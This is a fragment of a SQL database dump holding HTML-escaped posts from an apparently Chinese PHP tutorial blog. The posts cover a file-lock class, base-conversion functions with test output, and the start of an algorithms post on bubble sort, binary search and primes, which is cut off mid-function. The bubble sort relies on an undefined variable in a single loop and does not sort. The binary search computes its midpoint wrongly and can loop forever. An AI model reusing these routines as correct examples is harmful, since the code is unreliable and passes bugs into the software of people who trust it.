/&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;return false;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;return flock($this-&amp;gt;fp, LOCK_EX);&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}else{&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;return eaccelerator_lock($this-&amp;gt;name);&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;}&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;/**&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; * 解锁&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; * Enter description here ...&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; */&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;public function unlock()&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;{&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;if(!$this-&amp;gt;eAccelerator)&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;{&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;if($this-&amp;gt;fp !== false)&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;{&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;flock($this-&amp;gt;fp, LOCK_UN);&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;clearstatcache();&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;//进行关闭&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;fclose($this-&amp;gt;fp);&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}else{&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;return eaccelerator_unlock($this-&amp;gt;name);&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;}&lt;br /&gt;\r\n}&lt;br /&gt;\r\n?&amp;gt;&lt;/div&gt;\r\n&lt;br /&gt;\r\n使用如下：&lt;br /&gt;\r\n&lt;br /&gt;\r\n$lock = new CacheLock(''key_name'');&lt;br /&gt;\r\n$lock-&amp;gt;lock();&lt;br /&gt;\r\n//logic here&lt;br /&gt;\r\n$lock-&amp;gt;unlock();&lt;br /&gt;\r\n//使用过程中需要注意下文件锁所在路径需要有写权限.', 1, 1, 0, 0, 1303794574, 1, 'admin'),
(84, 1, '用PHP实现各种进制间的转换', '', '', '项目中有个这样的需求，就是十进制转换为二进制、八进制、十六进制，还有二进制、八进制、十六进制转十进制，下面记录一下，以后用的时候可以顺手拈来。&lt;br /&gt;\r\n&lt;br /&gt;\r\n从十进制向其它进制转换，用的是就用该数字不断除以要转换的进制数，读取余数。连接一起就可以了。下面是十进制转换为二进制、八进制、十六进制：&lt;br /&gt;\r\n&lt;div class=&quot;code&quot;&gt;&lt;br /&gt;\r\n&amp;lt;?php &lt;br /&gt;\r\n/**&lt;br /&gt;\r\n *十进制转二进制、八进制、十六进制 不足位数前面补零*&lt;br /&gt;\r\n *&lt;br /&gt;\r\n * @param array $datalist 传入数据array(100,123,130)&lt;br /&gt;\r\n * @param int $bin 转换的进制可以是：2,8,16&lt;br /&gt;\r\n * @return array 返回数据 array() 返回没有数据转换的格式&lt;br /&gt;\r\n */&lt;br /&gt;\r\nfunction decto_bin($datalist,$bin)&lt;br /&gt;\r\n{&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;static $arr=array(0,1,2,3,4,5,6,7,8,9,''A'',''B'',''C'',''D'',''E'',''F'');&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;if(!is_array($datalist)) $datalist=array($datalist);&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;if($bin==10)return $datalist; //相同进制忽略&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;$bytelen=ceil(16/$bin); //获得如果是$bin进制，一个字节的长度&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;$aOutChar=array();&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;foreach ($datalist as $num)&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;{&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;$t=&quot;&quot;;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;$num=intval($num);&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;if($num===0)continue;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;while($num&amp;gt;0)&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;{&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;$t=$arr[$num%$bin].$t;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;$num=floor($num/$bin);&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;$tlen=strlen($t);&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;if($tlen%$bytelen!=0)&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;{&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;$pad_len=$bytelen-$tlen%$bytelen;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;$t=str_pad(&quot;&quot;,$pad_len,&quot;0&quot;,STR_PAD_LEFT).$t; //不足一个字节长度，自动前面补充0&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;$aOutChar[]=$t;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;return $aOutChar;&lt;br /&gt;\r\n} &lt;br /&gt;\r\n测试结果如下：&lt;br /&gt;\r\n&lt;br /&gt;\r\nvar_dump(decto_bin(array(128,253),2));&lt;br /&gt;\r\nvar_dump(decto_bin(array(128,253),8));&lt;br /&gt;\r\nvar_dump(decto_bin(array(128,253),16));&lt;br /&gt;\r\n &lt;br /&gt;\r\nX-Powered-By: PHP/5.2.0&lt;br /&gt;\r\nContent-type: text/html&lt;br /&gt;\r\narray(2) {&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;[0]=&amp;gt;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;string(8) &quot;10000000&quot;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;[1]=&amp;gt;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;string(8) &quot;11111101&quot;&lt;br /&gt;\r\n}&lt;br /&gt;\r\narray(2) {&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;[0]=&amp;gt;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;string(4) &quot;0200&quot;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;[1]=&amp;gt;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;string(4) &quot;0375&quot;&lt;br /&gt;\r\n}&lt;br /&gt;\r\narray(2) {&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;[0]=&amp;gt;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;string(2) &quot;80&quot;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;[1]=&amp;gt;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;string(2) &quot;FD&quot;&lt;br /&gt;\r\n}&lt;/div&gt;\r\n&lt;br /&gt;\r\n二进制、八进制、十六进制转十进制用乘法，如：1101 转十进制：1*2^3+1*2^2+0*2^1+1*2^0，程序设计如下：&lt;br /&gt;\r\n&lt;div class=&quot;code&quot;&gt;&lt;br /&gt;\r\n&amp;lt;?php &lt;br /&gt;\r\n/**&lt;br /&gt;\r\n *二进制、八进制、十六进制 转十进制*&lt;br /&gt;\r\n *&lt;br /&gt;\r\n * @param array $datalist 传入数据array(df,ef)&lt;br /&gt;\r\n * @param int $bin 转换的进制可以是：2,8,16&lt;br /&gt;\r\n * @return array 返回数据 array() 返回没有数据转换的格式&lt;br /&gt;\r\n * @copyright chengmo QQ:8292669&lt;br /&gt;\r\n */&lt;br /&gt;\r\nfunction bin_todec($datalist,$bin)&lt;br /&gt;\r\n{&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;static $arr=array(''0''=&amp;gt;0,''1''=&amp;gt;1,''2''=&amp;gt;2,''3''=&amp;gt;3,''4''=&amp;gt;4,''5''=&amp;gt;5,''6''=&amp;gt;6,''7''=&amp;gt;7,''8''=&amp;gt;8,''9''=&amp;gt;9,''A''=&amp;gt;10,''B''=&amp;gt;11,''C''=&amp;gt;12,''D''=&amp;gt;13,''E''=&amp;gt;14,''F''=&amp;gt;15);&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;if(!is_array($datalist))$datalist=array($datalist);&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;if($bin==10)return $datalist; //为10进制不转换&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;$aOutData=array(); //定义输出保存数组&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;foreach ($datalist as $num)&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;{&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;$atnum=str_split($num); //将字符串分割为单个字符数组&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;$atlen=count($atnum);&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;$total=0;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;$i=1;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;foreach ($atnum as $tv)&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;{&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;$tv=strtoupper($tv);&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;if(array_key_exists($tv,$arr))&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;{&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;if($arr[$tv]==0)continue;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;$total=$total+$arr[$tv]*pow($bin,$atlen-$i);&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;$i++;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;$aOutData[]=$total;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;return $aOutData;&lt;br /&gt;\r\n}&lt;/div&gt;\r\n&lt;br /&gt;\r\n测试如下：&lt;br /&gt;\r\n&lt;div class=&quot;code&quot;&gt;&lt;br /&gt;\r\nvar_dump(bin_todec(array(''ff'',''ff33'',''cc33''),16));&lt;br /&gt;\r\nvar_dump(bin_todec(array(''1101101'',''111101101''),2));&lt;br /&gt;\r\nvar_dump(bin_todec(array(''1234123'',''12341''),8));&lt;br /&gt;\r\n &lt;br /&gt;\r\nX-Powered-By: PHP/5.2.0&lt;br /&gt;\r\nContent-type: text/html&lt;br /&gt;\r\narray(3) {&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;[0]=&amp;gt;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;int(255)&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;[1]=&amp;gt;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;int(65331)&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;[2]=&amp;gt;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;int(52275)&lt;br /&gt;\r\n}&lt;br /&gt;\r\narray(2) {&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;[0]=&amp;gt;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;int(124)&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;[1]=&amp;gt;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;int(508)&lt;br /&gt;\r\n}&lt;br /&gt;\r\narray(2) {&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;[0]=&amp;gt;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;int(342099)&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;[1]=&amp;gt;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;int(5345)&lt;br /&gt;\r\n}&lt;/div&gt;\r\n&lt;br /&gt;\r\n这些只是实现方式，其实不在乎php语言还是其它，实现思路都是一样的。php其实内置不少函数可以完成这些内容：bindec()，decoct()，dechex() base_convert() decbin() 这里只是实现思路而已。', 1, 1, 0, 0, 1303794640, 1, 'admin'),
(85, 1, 'PHP几个算法整理-PHP冒泡-PHP二分法-PHP求素数-PHP乘法表', '', '', 'PHP冒泡&lt;br /&gt;\r\nPHP二分法&lt;br /&gt;\r\nPHP求素数&lt;br /&gt;\r\nPHP乘法表&lt;br /&gt;\r\n&lt;br /&gt;\r\nPHP冒泡法 示例&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;div class=&quot;code&quot;&gt;&lt;br /&gt;\r\n//PHP冒泡&amp;nbsp;&amp;nbsp;从小到大&lt;br /&gt;\r\nfunction maopao(&amp;amp;amp;$arr)&lt;br /&gt;\r\n{&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;if(!empty($arr))&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;{&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;for($i=0;$i&amp;amp;lt;count($arr);$i++)&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;{&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;if($arr[$i]&amp;amp;gt;$arr[$j])&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;{&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;//开始交换&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;$temp = $arr[$i];&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;$arr[$i] = $arr[$j];&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;$arr[$j] = $temp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;return $arr;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;}&lt;br /&gt;\r\n}&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;br /&gt;\r\n&lt;br /&gt;\r\nphp二分法查找 代码示例&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;div class=&quot;code&quot;&gt;&lt;br /&gt;\r\n//二分法查找&lt;br /&gt;\r\nfunction erfenfa($a,$arr)&lt;br /&gt;\r\n{&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;print_r($arr);&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;if(!empty($a) &amp;amp;amp;&amp;amp;amp; !empty($arr))&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;{&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;$start = 0;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;$end = count($arr)-1;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;$i = 0;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;while($start &amp;amp;lt;= $end) &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;{&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;$i ++;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;$step = floor($end / 2);&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; if($a == $arr[$step])&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;print_r($arr[$step]);&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; return $a;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; if($a &amp;amp;gt; $arr[$step])&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;{&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;$start = $step;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;if($a &amp;amp;lt; $arr[$step])&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;{&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;$end = $step;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;}&lt;br /&gt;\r\n}&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;br /&gt;\r\n&lt;br /&gt;\r\nphp求素数 – 计算 a 到 b 之间的素数。 代码示例&lt;br /&gt;\r\n&lt;div class=&quot;code&quot;&gt;&lt;br /&gt;\r\n//php求素数&amp;nbsp;&amp;nbsp;- 计算 a 到 b 之间的素数。&lt;br /&gt;\r\nfunction sushu($a,$b)&lt;br /&gt;\r\n{&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;if(!empty($a) &amp;amp;amp;&amp;amp;amp; !empty($b))&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;{&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;if($b&amp;amp;lt;$a) return;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;$temp = array();&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;for($i=$a;$i&amp;amp;lt;=$b;$i++)&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;{&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;$j = intval(sqrt($i));&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;$flag = true;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;if($i&amp;amp;lt;=3)&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;{&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;$temp[$i] = $i;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}else&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;{&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;for($x=2;$x&amp;amp;lt;=$j;$x++)&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;{&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;if($i%$x==0)&lt;br 